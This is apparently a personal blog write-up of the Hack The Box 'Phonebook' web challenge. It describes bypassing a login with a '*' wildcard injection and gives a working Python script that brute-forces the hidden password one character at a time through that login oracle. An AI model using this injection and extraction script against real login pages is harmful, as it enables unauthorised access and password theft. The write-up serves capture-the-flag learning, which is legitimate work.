+++
title = "Hack The Box - Phonebook"
tags = [
    "ctf"
]
date = "2022-08-15"
toc = true
+++

# Premise

Phonebook is a `Web` challenge from Hack The Box that presents us with a login page for a "phonebook" system. The goal here is to find a flag hidden somewhere, however it's considerably less obvious than it may seem.

# Exploration

When first navigating to the challenge URL you'l be greeted with a login prompt to access the phonebook. There don't appear to be any useful links here, however there's a note that the system now supports "workstation logins" and that post is signed by someone called "Reese".

When attempting to map the site with `ffuf`/`dirb`, or getting other information from tools like `nikto` we don't get much back. There's a `/search` endpoint that appears to be the phonebook in question, but all requests to it just return a `403` since we're not authenticated.

My assumption at this point is that there must be some sort of authentication bypass possible. Maybe SQLi?

# See Quell Eye

Like the skiddie I am, I first started poking at the login form using Burp's `Intruder` and some SQLi wordlists, but those didn't turn up anything of interest. Long story short, usual/simple auth bypasses like `foo' or 1=1; -- ` got nowhere for either username or password fields.

This lead to something a bit simpler in my mind... There's very likely still a database behind this, and the username _might_ be `Reese` since that's what's noted on the main page. While further injection attacks here didn't seem to get anywhere, a simple `*` did. Total lack of protection against this. The backend query, effectively, would look something like `SELECT username FROM User WHERE username = 'Reese' AND password = *;`.

# We've got our bypass

This is where this gets fun. 

Despite being authenticated, and getting into the phonebook, the search results are basically useless. There's no flag, a hint of one, or even some of the expected characters (e.g. `{` or `}`) that would imply the flag could be extrapolated. Frustrating.

After poking at search results, a lot, looking for other SQLi opportunities and getting nowhere, I thought maybe the password was our flag? `*` let us in, maybe we can use that wildcard to our advantage... Sure enough, we can log in with `Reese` / `H*`, or `HT*`, `HTB{*`, etc...

# Well we're not going to _guess_ the flag...

This is one of the first `Easy` rated challenges I've seen on HTB that really does need you to write a script to be able to effectively solve it. Fortunately, it just needs something simple. In short, we need to iterate through a character list until we get a positive response from the website's login, then move on to enumerate the next character. Good thing there's no rate limiting!

We can scope the character list to alphanum + `_` based on what we've seen with other HTB flags, so at least we have a narrower set than we could have otherwise. Beyond that, we can use `requests` and iterate to the next potential character whenever we don't get a response URL containing `Authentication%20failed`.

The final script would look something like this:

```
import requests
from string import digits, ascii_letters

# Define our target
url = "http://<challenge_IP>/login"

# Set our char range to test
# We can't use string.printable as certain chars will trigger an endless loop
chars = ascii_letters + digits + '_'

# Set the start of our flag string to build on
flag = 'HTB{'

count = 0

while True:

  # Break if we find the flag
  if count == len(chars):
    print("The flag is: " + flag + '}')
    break

  # Construct the password char by char
  password = flag + chars[count] + '*}'
  print('Testing ' + password)

  # Got our username from the main page of the challenge
  data = {'username' : 'Reese', 'password' : password}
  response = requests.post(url, data=data)

  if (response.url != url + "?message=Authentication%20failed"):
    # This means we got a hit since HTB{<text>*} was accepted
    flag += chars[count]
    # Reset counter so we start fresh for next char
    count = 0
  else:
    # Increment counter since tested char wasn't valid
    count += 1
```

As soon as we iterate through the entire list of characters once, and get no success, we know that we've found our flag since it must be the end of the string (or we don't have the right char list).

GG! Fun to see a challenge on the either end requiring a bit of a more novel approach to solve!
